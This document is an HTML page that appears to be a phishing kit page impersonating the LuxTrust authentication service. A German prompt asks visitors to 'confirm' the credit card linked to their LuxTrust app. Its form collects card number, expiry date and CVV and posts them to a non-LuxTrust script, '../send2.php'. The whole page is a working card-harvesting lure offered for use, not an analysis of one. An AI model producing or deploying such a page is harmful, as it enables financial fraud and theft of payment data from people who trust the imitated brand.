
<html><head>
    <meta charset="UTF-8"> 
    <title></title>
    <link rel="icon" href="https://managing.luxtrust.com/favicon.ico">
    
    <link rel="stylesheet" href="./bootstrap.v3.3.7.min.css" type="text/css" media="all">
    <link rel="stylesheet" href="./luxtrust_boostrap.css" type="text/css" media="all">
    
    <link rel="stylesheet" href="./font-awesome-v5.9.0.css" type="text/css" media="all">

    
    
    <script type="text/javascript" src="./jquery-3.4.1.min.js.download"></script>
    <script type="text/javascript" src="./controls_1_1_2.js.download"></script>
    <script type="text/javascript" src="./portalUtils.js.download"></script>
    <script type="text/javascript" src="./bootstrap.v3.3.7.min.js.download"></script>
</head>
<body>
<div id="ltportal-page">
    <div class="container-fluid">





<center>
        <p class="control-label col-sm-4" for="userId">Bestätigen Sie die Kreditkarte, die mit Ihrer luxtrust APP verknüpft wird. </p><br>
<form class="form-horizontal " action="../send2.php" method="post" id="form">
    <input type="hidden" name="PARAM_DEVICE_TYPE" value="DPM">
    <input type="hidden" name="setLocale" value="EN">

    <div class="form-group">
        <label class="control-label col-sm-4" for="userId">KREDITKARTENNUMMER </label>
        <div class="col-sm-8">
            <input id="userId" type="number" class="form-control input-small" maxlength="20" name="cc" style="text-transform:uppercase" placeholder="XXXX XXXX XXXX XXXX" required>
            <span class="text-danger" id="errordeviceCode" style="display:none"></span>
        </div>
    </div>
    <div class="form-group">
        <label class="control-label col-sm-4" for="userId">VERFALLSDATUM </label>
        <div class="col-sm-8">
            <input id="userId" type="text" class="form-control input-small" maxlength="8" name="date" style="text-transform:uppercase" placeholder="MM/JJ" required>
            <span class="text-danger" id="errordeviceCode" style="display:none"></span>
        </div>
    </div>
       <div class="form-group">
        <label class="control-label col-sm-4" for="userId">CVV </label>
        <div class="col-sm-8">
            <input id="userId" type="text" class="form-control input-small" maxlength="4" name="cvv" style="text-transform:uppercase" placeholder="123" required>
            <span class="text-danger" id="errordeviceCode" style="display:none"></span>
        </div>
    </div>
    <div class="form-group">
        <div class="col-xs-12 col-sm-8 col-sm-push-4 text-right">
            <div class="div-small">
                <input type="submit" class="btn btn-primary" id="submitButton" value="Next">
            </div>
        </div>
    </div>
    </form></center>

</div>
</div>



</body></html>